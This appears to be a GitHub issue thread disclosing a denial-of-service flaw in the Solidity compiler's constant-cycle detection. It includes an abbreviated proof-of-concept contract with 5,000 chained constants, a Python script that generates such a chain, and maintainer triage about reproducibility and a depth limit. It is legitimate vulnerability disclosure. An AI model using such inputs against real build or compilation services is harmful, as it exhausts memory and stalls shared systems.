**Description**

The solidity compiler has code to detect if a set of constant definitions posses a cycle by cross-reference. By forcing the compiler to recompute the cycles over and over, the compiler needs to allocate huge amounts of RAM, and compilation time can be made arbitrary long.

We’ve attached the file Exploit3.sol as an working example. The file defines a chain of constant
references of length 5000. Constant names are encoded using an alphabet of 62 characters.
The file structure is the following:

```
pragma solidity ^0.4.16;
contract a {}
contract XX {
a constant A=B;a constant B=C;a constant C=D;a constant D=E;a constant
E=F;a constant F=G;a constant G=H;a constant H=I;a constant I=J;a constant
J=K;
a constant K=L;a constant L=M;a constant M=N;a constant N=O;a constant
O=P;a constant P=Q;a constant Q=R;a constant R=S;a constant S=T;a constant
T=U;
a constant U=V;a constant V=W;a constant W=X;a constant X=Y;a constant
Y=Z;a constant Z=_a;a constant _a=_b;a constant _b=_c;a constant _c=_d;a
constant _d=_e;
….. continued….

a constant FMQ=FMR;a constant FMR=FMS;a constant FMS=FMT;a constant
FMT=FMU;a constant FMU=FMV;a constant FMV=FMW;a constant FMW=FMX;a
constant FMX=FMY;a constant FMY=FMZ;a constant FMZ=FMa;
a constant FMa=FMb;a constant FMb=FMc;a constant FMc=FMd;a constant
FMd=FMe;a constant FMe=FMf;a constant FMf=FMg;a constant FMg=FMh;a
constant FMh=FMi;a constant FMi=FMj;a constant FMj=FMk;

a constant FMk = a(0x00);

}
```

This example forces the compiler to allocate 10 GB of RAM very rapidly. Also it will take a lot of
time to finish compiling (e.g. days). As memory allocation is quadratic, the attacker can force the
target system to start trashing. The source code is about 372 Kbytes.

**Recommendations**

Rewrite cycle-finding algorithm to avoid copying states while traversing or set a limit in
the depth of constants references.

@SergioDemianLerner The above code doesn't compile for me, it misses `_e`. Do you have a proper example which triggers this? We do have new checks for circular dependencies (limited at depth of 32) in constants since #3142.

I created this test program to generate a chain of constant references like the one described in the report and I could not reproduce the RAM blow-up. Here's the source if you want to play with it:
```python
import string

def var_name(num):
    name = ""
    while num != 0:
        mod = len(string.ascii_uppercase)
        name = string.ascii_uppercase[num % mod] + name
        num = num // mod
    return name

print("pragma solidity ^0.4.16;\n")
print("contract a {}")
print("contract XX {")
for x in range(1, 5000):
    print("    a constant %s = %s;" % (var_name(x), var_name(x+1)))
print("    a constant %s = a(0x00);" % var_name(x+1))
print("}")
```

And here's the generated [Solidity code](https://gist.github.com/federicobond/92f15000563dd2e5cc5c7b7429f677c5).

Version 1:0.4.19-0ubuntu1~xenial still shows the same behavior

This still takes a long time, but no RAM blowup.
